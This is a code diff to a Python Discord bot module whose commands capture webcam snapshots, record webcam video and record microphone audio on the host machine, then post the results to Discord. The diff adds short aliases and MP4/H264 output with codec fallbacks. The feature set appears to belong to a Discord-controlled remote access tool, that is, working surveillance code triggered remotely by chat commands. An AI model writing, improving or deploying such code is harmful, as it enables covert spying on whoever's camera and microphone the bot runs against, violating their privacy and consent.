@@ -133,7 +133,7 @@ class Media(commands.Cog):
         self.is_streaming_visuals = False
         await ctx.send("🛑 Visual stream stopped.")
 
-    @commands.command(name="camshot", help="Take a quick camera shot.")
+    @commands.command(name="camshot", aliases=["cs"], help="Take a quick camera shot.")
     async def camshot(self, ctx):
         try:
             cam = cv2.VideoCapture(0)
@@ -154,8 +154,8 @@ class Media(commands.Cog):
         except Exception as e:
             await ctx.send(f"❌ Camera Error: {str(e)}")
 
-    @commands.command(name="camvid", help="Record a video from the camera (default 10s).")
-    async def camvid(self, ctx, seconds: int = 10):
+    @commands.command(name="camvid", aliases=["cv"], help="Record a video from the camera. Formats: mp4 (Discord-friendly), avi.")
+    async def camvid(self, ctx, seconds: int = 10, format: str = "mp4", force: bool = False):
         if seconds > 60:
             await ctx.send("⚠️ Max video duration is 60 seconds.")
             seconds = 60
@@ -171,12 +171,39 @@ class Media(commands.Cog):
             height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))
             fps = 20.0 
 
-            # Use AVI with XVID
-            fourcc = cv2.VideoWriter_fourcc(*'XVID')
-            file_path = f"camvid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
+            # Discord playability requires H264 (avc1) for MP4
+            if format.lower() == "mp4":
+                # 'avc1' is the standard H264 codec for MP4 playability in Discord/Browsers
+                fourcc = cv2.VideoWriter_fourcc(*'avc1')
+                ext = ".mp4"
+            else:
+                # Use AVI with XVID (Universal fallback)
+                fourcc = cv2.VideoWriter_fourcc(*'XVID')
+                ext = ".avi"
+
+            file_path = f"camvid_{datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
             out = cv2.VideoWriter(file_path, fourcc, fps, (width, height))
 
-            await ctx.send(f"🎥 Recording {seconds}s video...")
+            # If H264 fails and force is not set, fallback to XVID/AVI
+            if not out.isOpened():
+                if force:
+                    await ctx.send(f"❌ Error: Forced format `{format}` with specific codec failed to initialize.")
+                    cam.release()
+                    return
+                
+                if format.lower() == "mp4":
+                    # Try mp4v as second attempt for MP4
+                    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+                    out = cv2.VideoWriter(file_path, fourcc, fps, (width, height))
+                    
+                    if not out.isOpened():
+                        # Ultimate fallback to AVI
+                        fourcc = cv2.VideoWriter_fourcc(*'XVID')
+                        file_path = file_path.replace(".mp4", ".avi")
+                        ext = ".avi"
+                        out = cv2.VideoWriter(file_path, fourcc, fps, (width, height))
+
+            await ctx.send(f"🎥 Recording {seconds}s video in `{ext}` format...")
             
             start_time = time.time()
             # Capture loop - careful with asyncio.sleep to not block but also not drift too much
@@ -200,7 +227,7 @@ class Media(commands.Cog):
         except Exception as e:
             await ctx.send(f"❌ Camera Video Error: {str(e)}")
 
-    @commands.command(name="audiorecord", help="Record audio (default 10s).")
+    @commands.command(name="audiorecord", aliases=["ar"], help="Record audio (default 10s).")
     async def audiorecord(self, ctx, seconds: int = 10):
         if seconds > 60:
             await ctx.send("⚠️ Max audio duration is 60 seconds.")
